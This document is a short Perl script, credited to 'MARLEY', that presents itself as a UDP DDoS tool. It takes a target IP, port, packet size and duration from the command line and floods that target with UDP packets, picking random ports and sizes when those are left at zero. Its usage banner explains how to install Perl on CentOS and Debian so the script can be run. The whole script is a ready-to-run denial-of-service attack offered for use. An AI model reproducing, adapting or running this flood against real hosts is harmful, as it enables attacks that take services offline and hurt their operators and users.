#!/usr/bin/perl 

##############
# udp flood.
##############

use Socket;
use strict;

if ($#ARGV != 3) {
print " \n";
print " UDP DDoS // by MARLEY\n\n";
print " * CetOS Perl Error: yum install perl -y\n";
print " * Ubuntu&Debian Perl Error: apt-get install perl -y\n";
print " * Order: perl marleyv3.pl <IP-address> <Port> <Packets> <Time (In seconds)>\n";
print " - * Port: Port to flood. Set to 0 for all.\n";
print " - * Packets: The number of packets to send. Between 64 and 1024.\n";
print " - * Time: Flood time in seconds.\n";
exit(1);
}

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Unable to connect to $ip\n";
$endtime = time() + ($time ? $time : 1000000);

socket(flood, PF_INET, SOCK_DGRAM, 17);


print "Flooding in ongoing $ip with the port " . ($port ? $port : "random") . ", sends to " .
($size ? "$size-byte" : "random size") . " packets" .
($time ? " for $time seconds" : "") . "\n";
print "Attack stopped with Ctrl-C\n" unless $time;

for (;time() <= $endtime;) {
$psize = $size ? $size : int(rand(1500-64)+64) ;
$pport = $port ? $port : int(rand(65500))+1;

send(flood, pack("a$psize","bostanATTACKblZaN2Fis2eF5zEhPfcC4NS3CHEvupxYzN9cpwk4coONOjJBKdehE3tFdUYUBc5cD26f8gWgEADGJb9FOXjSUfEo6dZwk3IIhq199wQryTXOD0XH4900PcFwLlvpKLaokHNSKL1W5j3niiiBOslyk7cdEDFCYJcIiHV3FJjVUTHMp3aZdCTvclzQSnaUDblN4jq1xWpWxIpFQKEvYynooM34tFpsm90LoxohJEBUwjLu8dC6fomGle6yS7yipFKJhchjwacGRpAhmHh7SavYNZ71PcNqY5lTdCeVD31GfUpSE6rXKIMXLZaS1zST3UzLW6oaduC9dg4xjY7lYJPw8LaNfLZnTpIDdVbsiiOQqMpJl8AlqG1rt1GXeCSjwgJfFbdarkKxsUuV7yoA5S0kMKYfAyOtv9Cwl5kxNaG2mqV7e2osQ9S0syDTPNyOISlnAMcApJiNs5BgQthm3jAFTtxhYrB8NHu8eXMd3HubH95JBiCeeinoE9e997Gaz4RIABwnTrpoxGvSPD2ULRAqdFLVf7BNTFu5ejKRqtwOmmfRXr3E2JhvHDUBDe3JgeVqxoHI9YWIyCk0zx8EzDkNU4J6dnlRZelvO55MBPZ2SLjGXnNv9Qqw3SeLUyrsqvwtr4XmwIUUwWOyy6RorsaeY4i4CXl9xyKQBVpqkNs9XRxVDI0B4f4dw1aRjILIJRfSLgwXClLariseo6mtchyjsamlurh3imP2FeVEQO2AY66qd5eoilgANItN772qsdgspOVVeglDiaQIL7y9gy3aphFBMaLyKpBnMj9HSxrp0Nb7cRIDN6xBbRyWT7T3dmWVn8yjNBOHb4xvs53Qeh310jcWB7fwPSer9cBCQSvM0za04VR53fBFWfoTliC19hjxetxyJfIIW8H17DdISUGpMXa0yjs1QnEE5DejuATIQ9u6DvMWfKCiSCQUihh8DddYkwXPLbEWL8oexNicSkYrA6WVcQoAz3z7ayCQBOyJ3xaygiMWKH9rWp6sTqUXLP9gtUEOvAedA7Xk"), 0, pack_sockaddr_in($pport, $iaddr));}